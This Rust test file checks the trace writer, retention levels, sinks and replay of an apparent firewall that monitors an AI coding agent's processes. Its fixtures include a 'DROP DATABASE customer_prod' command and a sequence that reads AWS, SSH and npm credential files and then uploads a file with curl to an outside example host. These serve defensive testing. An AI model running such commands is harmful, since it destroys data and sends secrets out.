//! Tests of the trace storage, the sinks and the replay.

use std::io::Write;
use std::sync::{Arc, Mutex};

use af_core::{
    Action, ApprovalOutcome, Decision, Event, EventKind, EventSink, InputStream, MonitorCapability,
    Pid, ProcessInfo, RiskLevel, RuleMatch, SessionId, SessionMeta, Verdict,
};
use af_provenance::ProcessGraph;
use af_recorder::{
    read_trace, FanoutSink, MemorySink, Retention, StreamSink, TraceReader, TraceWriter,
};

/// A destination that the test can read back.
#[derive(Clone, Default)]
struct Shared(Arc<Mutex<Vec<u8>>>);

impl Shared {
    fn text(&self) -> String {
        String::from_utf8(self.0.lock().expect("lock").clone()).expect("text")
    }
}

impl Write for Shared {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        self.0.lock().expect("lock").extend_from_slice(buf);
        Ok(buf.len())
    }

    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

/// Makes a directory for the trace files of one test.
///
/// The directory lies under the crate. The shared temporary directory of the
/// machine can be full, and a test of the storage must not fail for that
/// reason. The directory goes away when the test ends.
fn temp_dir() -> tempfile::TempDir {
    let base = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("test-traces");
    std::fs::create_dir_all(&base).expect("base directory");
    tempfile::Builder::new()
        .prefix("trace-")
        .tempdir_in(&base)
        .expect("temporary directory")
}

fn session_meta() -> SessionMeta {
    let mut meta = SessionMeta::new(vec!["claude".to_string()], "/work".to_string());
    meta.session_id = SessionId::from("afw-1a2b");
    meta.root_pid = 1000;
    meta
}

fn event(kind: EventKind, pid: Pid) -> Event {
    Event::new(SessionId::from("afw-1a2b"), pid, kind)
}

fn process(pid: Pid, ppid: Pid, exe: &str, argv: &[&str], start_ticks: u64) -> ProcessInfo {
    ProcessInfo {
        pid,
        ppid: Some(ppid),
        start_ticks,
        exe: Some(exe.to_string()),
        comm: exe.rsplit('/').next().unwrap_or(exe).to_string(),
        argv: argv.iter().map(|a| a.to_string()).collect(),
        cwd: Some("/work".to_string()),
        ..Default::default()
    }
}

fn exec(pid: Pid, ppid: Pid, exe: &str, argv: &[&str], start_ticks: u64) -> Event {
    event(
        EventKind::ProcessExec {
            process: Box::new(process(pid, ppid, exe, argv, start_ticks)),
        },
        pid,
    )
}

fn fork(parent: Pid, child: Pid) -> Event {
    event(
        EventKind::ProcessFork {
            child_pid: child,
            is_thread: false,
        },
        parent,
    )
}

fn drop_action() -> Action {
    Action::Exec {
        exe: Some("/usr/bin/psql".to_string()),
        program: "psql".to_string(),
        argv: vec![
            "psql".to_string(),
            "-c".to_string(),
            "DROP DATABASE customer_prod".to_string(),
        ],
        cwd: Some("/work".to_string()),
        env: Default::default(),
    }
}

fn hold_verdict() -> Verdict {
    Verdict::from_matches(vec![RuleMatch {
        rule_id: "database.destructive.drop-database".to_string(),
        title: "DROP DATABASE".to_string(),
        category: "database".to_string(),
        risk: RiskLevel::ApprovalRequired,
        decision: Decision::ApprovalRequired,
        reason: "the command removes a database".to_string(),
    }])
}

fn decision_event(pid: Pid, verdict: Verdict, ancestry: Vec<ProcessInfo>) -> Event {
    event(
        EventKind::PolicyDecision {
            action: Box::new(drop_action()),
            verdict: Box::new(verdict),
            ancestry,
        },
        pid,
    )
}

/// One event of every kind, with text that a line format must survive.
fn one_of_every_kind() -> Vec<Event> {
    vec![
        event(
            EventKind::SessionStart {
                meta: Box::new(session_meta()),
                capabilities: vec![
                    MonitorCapability::available("process_events"),
                    MonitorCapability::missing("exec_interception", "no ptrace"),
                ],
            },
            1000,
        ),
        fork(1000, 1001),
        exec(
            1001,
            1000,
            "/usr/bin/bash",
            &["bash", "-c", "./migrate.sh"],
            11,
        ),
        event(
            EventKind::ProcessExit {
                code: Some(3),
                signal: None,
                sid: None,
            },
            1001,
        ),
        event(
            EventKind::FileOpen {
                path: "/home/dev/.ssh/id_ed25519".to_string(),
                write: false,
            },
            1002,
        ),
        event(
            EventKind::NetworkConnect {
                addr: "10.0.0.7".to_string(),
                port: 5432,
                host: Some("db.prod.example.com".to_string()),
            },
            1003,
        ),
        event(
            EventKind::StdinWrite {
                stream: InputStream::Stdin,
                // A line break and an escape must not break the line format.
                data: "DROP DATABASE customer_prod;\n\u{1b}[31m".to_string(),
            },
            1003,
        ),
        decision_event(
            1003,
            hold_verdict(),
            vec![process(1002, 1001, "/work/migrate.sh", &["migrate.sh"], 12)],
        ),
        event(
            EventKind::ApprovalRequested {
                action: Box::new(drop_action()),
                rule_id: "database.destructive.drop-database".to_string(),
            },
            1003,
        ),
        event(
            EventKind::ApprovalResolved {
                rule_id: "database.destructive.drop-database".to_string(),
                outcome: ApprovalOutcome::Deny,
                waited_ms: 4200,
            },
            1003,
        ),
        event(
            EventKind::MonitorWarning {
                message: "cannot read the working directory of pid 1004".to_string(),
            },
            1004,
        ),
        event(
            EventKind::SessionEnd {
                exit_code: Some(0),
                process_count: 4,
            },
            1000,
        ),
    ]
}

/// The demo session, with noise that retention must remove.
fn demo_session() -> (SessionMeta, Vec<Event>) {
    let meta = session_meta();
    let events = vec![
        event(
            EventKind::SessionStart {
                meta: Box::new(meta.clone()),
                capabilities: Vec::new(),
            },
            1000,
        ),
        fork(1000, 1001),
        exec(
            1001,
            1000,
            "/usr/bin/bash",
            &["bash", "-c", "./migrate.sh"],
            11,
        ),
        fork(1001, 1002),
        exec(1002, 1001, "/work/migrate.sh", &["/work/migrate.sh"], 12),
        // Noise: a normal file read and a normal command.
        event(
            EventKind::FileOpen {
                path: "/work/migrate.sh".to_string(),
                write: false,
            },
            1002,
        ),
        fork(1001, 1004),
        exec(1004, 1001, "/usr/bin/ls", &["ls", "-la"], 14),
        decision_event(1004, Verdict::allow(), Vec::new()),
        event(
            EventKind::ProcessExit {
                code: Some(0),
                signal: None,
                sid: None,
            },
            1004,
        ),
        // The dangerous action.
        fork(1002, 1003),
        exec(
            1003,
            1002,
            "/usr/bin/psql",
            &["psql", "-c", "DROP DATABASE customer_prod"],
            13,
        ),
        event(
            EventKind::StdinWrite {
                stream: InputStream::Stdin,
                data: "DROP DATABASE customer_prod;".to_string(),
            },
            1003,
        ),
        decision_event(
            1003,
            hold_verdict(),
            vec![
                process(1002, 1001, "/work/migrate.sh", &["/work/migrate.sh"], 12),
                process(
                    1001,
                    1000,
                    "/usr/bin/bash",
                    &["bash", "-c", "./migrate.sh"],
                    11,
                ),
                ProcessInfo {
                    pid: 1000,
                    comm: "claude".to_string(),
                    argv: vec!["claude".to_string()],
                    ..Default::default()
                },
            ],
        ),
        event(
            EventKind::ApprovalRequested {
                action: Box::new(drop_action()),
                rule_id: "database.destructive.drop-database".to_string(),
            },
            1003,
        ),
        event(
            EventKind::ApprovalResolved {
                rule_id: "database.destructive.drop-database".to_string(),
                outcome: ApprovalOutcome::Deny,
                waited_ms: 1200,
            },
            1003,
        ),
        event(
            EventKind::SessionEnd {
                exit_code: Some(1),
                process_count: 5,
            },
            1000,
        ),
    ];
    (meta, events)
}

fn write_trace(
    path: &std::path::Path,
    retention: Retention,
    events: &[Event],
) -> af_recorder::WriterStats {
    let mut writer = TraceWriter::create(path, retention).expect("create");
    for event in events {
        writer.record(event).expect("record");
    }
    writer.stats()
}

/// The writer numbers the events from 1 upwards, without a hole.
#[test]
fn the_writer_numbers_every_event() {
    let dir = temp_dir();
    let path = dir.path().join("deep").join("session.jsonl");
    let (_, events) = demo_session();
    write_trace(&path, Retention::All, &events);

    let back = read_trace(&path).expect("read");
    assert_eq!(back.len(), events.len());
    let numbers: Vec<u64> = back.iter().map(|event| event.seq).collect();
    let wanted: Vec<u64> = (1..=events.len() as u64).collect();
    assert_eq!(numbers, wanted);
}

/// One event is one line, and a line always parses back to the same event.
#[test]
fn every_event_kind_survives_a_round_trip() {
    let dir = temp_dir();
    let path = dir.path().join("kinds.jsonl");
    let events = one_of_every_kind();
    write_trace(&path, Retention::All, &events);

    let text = std::fs::read_to_string(&path).expect("read");
    assert_eq!(
        text.lines().count(),
        events.len(),
        "one event must give one line"
    );

    let back = read_trace(&path).expect("read");
    assert_eq!(back.len(), events.len());
    for (index, (before, after)) in events.iter().zip(back.iter()).enumerate() {
        let mut wanted = before.clone();
        wanted.seq = index as u64 + 1;
        assert_eq!(&wanted, after, "event {index} changed");
    }
}

/// The balanced level keeps evidence and process activity.
#[test]
fn balanced_keeps_evidence_and_process_activity() {
    let keep = [
        EventKind::SessionStart {
            meta: Box::new(session_meta()),
            capabilities: Vec::new(),
        },
        EventKind::SessionEnd {
            exit_code: None,
            process_count: 1,
        },
        EventKind::ApprovalRequested {
            action: Box::new(drop_action()),
            rule_id: "r".to_string(),
        },
        EventKind::ApprovalResolved {
            rule_id: "r".to_string(),
            outcome: ApprovalOutcome::Allow,
            waited_ms: 1,
        },
        EventKind::PolicyDecision {
            action: Box::new(drop_action()),
            verdict: Box::new(hold_verdict()),
            ancestry: Vec::new(),
        },
        EventKind::ProcessExec {
            process: Box::new(process(1, 0, "/usr/bin/ls", &["ls"], 1)),
        },
        EventKind::ProcessFork {
            child_pid: 2,
            is_thread: false,
        },
        EventKind::ProcessExit {
            code: Some(0),
            signal: None,
            sid: None,
        },
        EventKind::MonitorWarning {
            message: "no ptrace".to_string(),
        },
    ];
    for kind in keep {
        let label = kind.label();
        assert!(
            Retention::Balanced.should_keep(&event(kind, 1)),
            "balanced must keep {label}"
        );
    }

    let drop = [
        EventKind::PolicyDecision {
            action: Box::new(drop_action()),
            verdict: Box::new(Verdict::allow()),
            ancestry: Vec::new(),
        },
        EventKind::FileOpen {
            path: "/work/main.rs".to_string(),
            write: false,
        },
        EventKind::NetworkConnect {
            addr: "127.0.0.1".to_string(),
            port: 80,
            host: None,
        },
        EventKind::StdinWrite {
            stream: InputStream::Stdin,
            data: "ls\n".to_string(),
        },
    ];
    for kind in drop {
        let label = kind.label();
        assert!(
            !Retention::Balanced.should_keep(&event(kind, 1)),
            "balanced must drop {label}"
        );
    }
}

/// Every level keeps everything that explains a decision.
#[test]
fn every_level_keeps_the_evidence() {
    let (_, events) = demo_session();
    for level in Retention::all_levels() {
        for event in &events {
            if event.kind.is_evidence() {
                assert!(
                    level.should_keep(event),
                    "{level} must keep {}",
                    event.kind_label()
                );
            }
        }
    }
    assert!(Retention::All.should_keep(&event(
        EventKind::StdinWrite {
            stream: InputStream::Stdin,
            data: "ls".to_string(),
        },
        1
    )));
}

/// The counters of the writer always add up to the events that it saw.
#[test]
fn the_writer_counts_what_it_kept_and_dropped() {
    let dir = temp_dir();
    let (_, events) = demo_session();

    for level in Retention::all_levels() {
        let path = dir.path().join(format!("{level}.jsonl"));
        let stats = write_trace(&path, level, &events);
        assert_eq!(
            stats.kept + stats.dropped,
            events.len() as u64,
            "{level} lost an event"
        );
        let back = read_trace(&path).expect("read");
        assert_eq!(
            back.len() as u64,
            stats.kept,
            "{level} wrote another number"
        );
    }
}

/// The narrow level keeps the decision and the exec events that it names.
#[test]
fn evidence_only_keeps_the_named_exec_events() {
    let dir = temp_dir();
    let path = dir.path().join("evidence.jsonl");
    let (_, events) = demo_session();
    write_trace(&path, Retention::EvidenceOnly, &events);

    let back = read_trace(&path).expect("read");
    let kinds: Vec<&str> = back.iter().map(|event| event.kind_label()).collect();
    assert_eq!(
        kinds,
        vec![
            "session_start",
            // The chain of the held action, in the order of its arrival.
            "process_exec",
            "process_exec",
            "process_exec",
            "policy_decision",
            "approval_requested",
            "approval_resolved",
            "session_end",
        ]
    );
    let execs: Vec<Pid> = back
        .iter()
        .filter(|event| matches!(event.kind, EventKind::ProcessExec { .. }))
        .map(|event| event.pid)
        .collect();
    assert_eq!(execs, vec![1001, 1002, 1003], "the parents come first");
    assert!(
        !back.iter().any(|event| event.pid == 1004),
        "a process without a decision does not reach the file"
    );
}

/// A broken line must not hide the events after it.
#[test]
fn a_broken_line_does_not_stop_the_reader() {
    let dir = temp_dir();
    let path = dir.path().join("broken.jsonl");
    let events = one_of_every_kind();
    write_trace(&path, Retention::All, &events);

    let mut lines: Vec<String> = std::fs::read_to_string(&path)
        .expect("read")
        .lines()
        .map(|line| line.to_string())
        .collect();
    lines.insert(2, "{\"seq\": 99, this is not json".to_string());
    lines.insert(5, String::new());
    lines.push("{\"seq\":1,\"ts\":0}".to_string());
    std::fs::write(&path, lines.join("\n")).expect("write");

    let mut good = 0;
    let mut bad = 0;
    for item in TraceReader::open(&path).expect("open") {
        match item {
            Ok(_) => good += 1,
            Err(af_core::Error::Trace(message)) => {
                bad += 1;
                assert!(message.contains("broken.jsonl"), "{message}");
            }
            Err(other) => panic!("wrong error: {other}"),
        }
    }
    assert_eq!(good, events.len(), "every good line still arrives");
    assert_eq!(bad, 2, "both broken lines give an error");

    let error = read_trace(&path).expect_err("read_trace stops");
    assert!(matches!(error, af_core::Error::Trace(_)), "{error}");
}

/// The metadata of a session is known when the reader opens the file.
#[test]
fn the_reader_knows_the_session_at_once() {
    let dir = temp_dir();
    let path = dir.path().join("session.jsonl");
    let (meta, events) = demo_session();
    write_trace(&path, Retention::All, &events);

    let reader = TraceReader::open(&path).expect("open");
    let found = reader.session_meta().expect("metadata").clone();
    assert_eq!(found.session_id, meta.session_id);
    assert_eq!(found.root_pid, 1000);
    assert_eq!(
        reader.count(),
        events.len(),
        "the first event still comes out of the iterator"
    );

    let empty = dir.path().join("empty.jsonl");
    std::fs::write(&empty, "").expect("write");
    let reader = TraceReader::open(&empty).expect("open");
    assert!(reader.session_meta().is_none());
    assert_eq!(reader.count(), 0);
}

/// A session that ends badly must still leave usable evidence.
#[test]
fn the_writer_flushes_the_evidence() {
    let dir = temp_dir();
    let path = dir.path().join("crash.jsonl");
    let (meta, _) = demo_session();

    let mut writer = TraceWriter::create(&path, Retention::All).expect("create");
    writer
        .record(&event(
            EventKind::SessionStart {
                meta: Box::new(meta),
                capabilities: Vec::new(),
            },
            1000,
        ))
        .expect("record");
    assert_eq!(
        read_trace(&path).expect("read").len(),
        1,
        "evidence reaches the file at once"
    );

    writer.record(&fork(1000, 1001)).expect("record");
    writer.record(&fork(1001, 1002)).expect("record");
    assert_eq!(
        read_trace(&path).expect("read").len(),
        1,
        "normal activity waits in the buffer"
    );

    // The session goes away without a call to flush.
    drop(writer);
    assert_eq!(read_trace(&path).expect("read").len(), 3);
}

/// A replay of a trace must draw the same tree as the live session.
///
/// This proves that a trace can test a policy later, which the storage
/// requirement of the project asks for.
#[test]
fn a_replayed_trace_draws_the_same_tree() {
    let dir = temp_dir();
    let (meta, events) = demo_session();

    let mut live = ProcessGraph::new(&meta);
    for event in &events {
        live.apply(event);
    }
    let wanted = live.render_tree();
    assert!(
        wanted.contains("psql -c DROP DATABASE customer_prod [pid 1003]  ✖ approval-required"),
        "{wanted}"
    );

    for level in [Retention::All, Retention::Balanced] {
        let path = dir.path().join(format!("replay-{level}.jsonl"));
        write_trace(&path, level, &events);
        let replay = ProcessGraph::from_trace(&read_trace(&path).expect("read"));
        assert_eq!(replay.render_tree(), wanted, "{level} changed the tree");
        assert_eq!(replay.len(), live.len());
        assert_eq!(replay.ancestry(1003), live.ancestry(1003));
        assert_eq!(replay.gap_count(), 0);
    }

    // The narrow level keeps the chain of the held action only.
    let path = dir.path().join("replay-evidence.jsonl");
    write_trace(&path, Retention::EvidenceOnly, &events);
    let replay = ProcessGraph::from_trace(&read_trace(&path).expect("read"));
    let tree = replay.render_tree();
    assert_eq!(
        tree,
        concat!(
            "afw-1a2b (root)\n",
            "└─ claude [pid 1000]\n",
            "   └─ bash -c ./migrate.sh [pid 1001]\n",
            "      └─ migrate.sh [pid 1002]\n",
            "         └─ psql -c DROP DATABASE customer_prod [pid 1003]  ✖ approval-required"
        )
    );
    assert_eq!(replay.gap_count(), 0, "the chain is complete");
    assert!(replay.process(1004).is_none(), "the noise is gone");
}

/// The memory sink keeps the events and numbers them.
#[test]
fn the_memory_sink_keeps_every_event() {
    let (_, events) = demo_session();
    let mut sink = MemorySink::new();
    for event in &events {
        sink.record(event).expect("record");
    }
    assert_eq!(sink.events().len(), events.len());
    let numbers: Vec<u64> = sink.events().iter().map(|event| event.seq).collect();
    assert_eq!(numbers, (1..=events.len() as u64).collect::<Vec<u64>>());

    let graph = ProcessGraph::from_trace(sink.events());
    assert_eq!(graph.len(), 5);

    let taken = sink.take();
    assert_eq!(taken.len(), events.len());
    assert!(MemorySink::default().events().is_empty());
}

/// The fanout gives the same event to every destination.
#[test]
fn the_fanout_reaches_every_sink() {
    let dir = temp_dir();
    let path = dir.path().join("fanout.jsonl");
    let stream = Shared::default();
    let (_, events) = demo_session();

    {
        let mut fanout = FanoutSink::with(vec![
            Box::new(TraceWriter::create(&path, Retention::Balanced).expect("create")),
            Box::new(StreamSink::json(stream.clone())),
        ]);
        assert_eq!(fanout.len(), 2);
        fanout.add(Box::new(MemorySink::new()));
        assert!(!fanout.is_empty());
        for event in &events {
            fanout.record(event).expect("record");
        }
        fanout.flush().expect("flush");
    }

    let file_events = read_trace(&path).expect("read");
    assert!(file_events.len() < events.len(), "balanced dropped noise");
    assert_eq!(
        stream.text().lines().count(),
        events.len(),
        "the stream keeps everything"
    );
    assert!(FanoutSink::new().is_empty());
}

/// The human form explains a held action and hides escape sequences.
#[test]
fn the_stream_sink_explains_a_held_action() {
    let out = Shared::default();
    let mut sink = StreamSink::human(out.clone());
    for event in one_of_every_kind() {
        sink.record(&event).expect("record");
    }
    sink.flush().expect("flush");

    let text = out.text();
    assert!(!text.contains('\u{1b}'), "no escape reaches the terminal");
    assert!(text.contains("process_exec"), "{text}");
    assert!(text.contains("bash -c ./migrate.sh"), "{text}");
    assert!(
        text.contains("db.prod.example.com (10.0.0.7:5432)"),
        "{text}"
    );
    assert!(text.contains("exit code 3"), "{text}");
    assert!(text.contains("Attempted operation:"), "{text}");
    assert!(
        text.contains("database.destructive.drop-database"),
        "{text}"
    );
    assert!(text.contains("Decision:"), "{text}");
    assert!(text.contains("deny after 4200 ms"), "{text}");
}

/// The JSON form of the stream sink reads back as a trace.
#[test]
fn the_stream_sink_writes_a_trace() {
    let out = Shared::default();
    let mut sink = StreamSink::json(out.clone());
    let events = one_of_every_kind();
    for event in &events {
        sink.record(event).expect("record");
    }

    let text = out.text();
    let reader = TraceReader::from_reader(std::io::Cursor::new(text.into_bytes()), "stream");
    let back: Vec<Event> = reader.map(|item| item.expect("event")).collect();
    assert_eq!(back.len(), events.len());
    assert_eq!(back[0].seq, 1);
    assert_eq!(back[back.len() - 1].seq, events.len() as u64);
}

/// A writer without a file also works, for a test or a pipe.
#[test]
fn the_writer_can_write_to_any_destination() {
    let out = Shared::default();
    let mut writer = TraceWriter::to_writer(out.clone(), Retention::Balanced);
    assert_eq!(writer.retention(), Retention::Balanced);
    let (_, events) = demo_session();
    for event in &events {
        writer.record(event).expect("record");
    }
    writer.flush().expect("flush");

    let stats = writer.stats();
    assert!(stats.kept > 0 && stats.dropped > 0);
    assert_eq!(out.text().lines().count() as u64, stats.kept);
}

// ---------------------------------------------------------------------------
// What `Balanced` keeps of a file open and a connection
// ---------------------------------------------------------------------------

/// Makes the file action of an open.
fn open_action(path: &str) -> Action {
    Action::FileOpen {
        path: path.to_string(),
        write: false,
    }
}

/// Makes the event of an open that a process makes.
fn open_event(pid: Pid, path: &str) -> Event {
    event(
        EventKind::FileOpen {
            path: path.to_string(),
            write: false,
        },
        pid,
    )
}

/// Makes the decision event that the firewall emits after an action.
fn action_decision(pid: Pid, action: Action, matches: Vec<RuleMatch>) -> Event {
    event(
        EventKind::PolicyDecision {
            action: Box::new(action),
            verdict: Box::new(Verdict::from_matches(matches)),
            ancestry: Vec::new(),
        },
        pid,
    )
}

/// Makes a match of the level `info` that only writes something down.
fn info_match(rule_id: &str) -> RuleMatch {
    RuleMatch {
        rule_id: rule_id.to_string(),
        title: "a credential store was read".to_string(),
        category: "memory".to_string(),
        risk: RiskLevel::Info,
        decision: Decision::Allow,
        reason: "the session read a stored credential".to_string(),
    }
}

/// The event stream of the credential chain, exactly as a live session emits
/// it: the action first, and the decision of that action directly after it.
fn credential_chain() -> Vec<Event> {
    let mut events = vec![event(
        EventKind::SessionStart {
            meta: Box::new(session_meta()),
            capabilities: Vec::new(),
        },
        1000,
    )];
    events.push(exec(1001, 1000, "/usr/bin/node", &["node", "agent.js"], 11));
    for path in [
        "/home/dev/.aws/credentials",
        "/home/dev/.ssh/id_ed25519",
        "/home/dev/.npmrc",
    ] {
        events.push(open_event(1001, path));
        events.push(action_decision(
            1001,
            open_action(path),
            vec![info_match("memory.credentials.read-mark")],
        ));
    }
    // Ordinary work: an open that no rule matched. The firewall records no
    // decision for it at all.
    events.push(open_event(1001, "/home/dev/app/src/main.rs"));
    events.push(exec(
        1002,
        1001,
        "/usr/bin/curl",
        &["curl", "-T", "out.txt", "https://files.example.com/u"],
        12,
    ));
    events.push(event(
        EventKind::SessionEnd {
            exit_code: Some(0),
            process_count: 3,
        },
        1000,
    ));
    events
}

/// The promise of `Balanced`: an action that a rule matched stays.
///
/// A rule of the level `info` counts. The mark of a credential read is such a
/// rule, and the session memory of a replay is built from exactly those
/// events. Before this behaviour existed, a chain that the live session found
/// replayed to nothing.
#[test]
fn balanced_keeps_a_file_open_that_a_rule_matched() {
    let dir = temp_dir();
    let path = dir.path().join("balanced-chain.jsonl");
    let events = credential_chain();
    write_trace(&path, Retention::Balanced, &events);

    let back = read_trace(&path).expect("read");
    let opens: Vec<String> = back
        .iter()
        .filter_map(|event| match &event.kind {
            EventKind::FileOpen { path, .. } => Some(path.clone()),
            _ => None,
        })
        .collect();
    assert_eq!(
        opens,
        vec![
            "/home/dev/.aws/credentials".to_string(),
            "/home/dev/.ssh/id_ed25519".to_string(),
            "/home/dev/.npmrc".to_string(),
        ],
        "every open that a rule matched must stay, and only those:\n{back:#?}"
    );
    // The trace keeps one order and one numbering.
    let numbers: Vec<u64> = back.iter().map(|event| event.seq).collect();
    assert_eq!(numbers, (1..=back.len() as u64).collect::<Vec<u64>>());
    // The held event goes out before the decision that released it.
    let first_open = back
        .iter()
        .position(|event| matches!(event.kind, EventKind::FileOpen { .. }))
        .expect("the trace holds an open");
    assert!(
        first_open > 0,
        "the exec of the process stands before its first open"
    );
}

/// A held action that gets no decision of its own goes away.
#[test]
fn balanced_drops_a_file_open_that_no_rule_matched() {
    let out = Shared::default();
    let mut writer = TraceWriter::to_writer(out.clone(), Retention::Balanced);
    let events = credential_chain();
    for event in &events {
        writer.record(event).expect("record");
    }
    writer.flush().expect("flush");

    let text = out.text();
    assert!(
        !text.contains("main.rs"),
        "an open that no rule matched must not reach storage:\n{text}"
    );
    let stats = writer.stats();
    assert_eq!(
        stats.kept + stats.dropped,
        events.len() as u64,
        "the counters must add up to the events that the writer saw"
    );
    assert_eq!(
        text.lines().count() as u64,
        stats.kept,
        "the file holds exactly the events that the writer kept"
    );
}
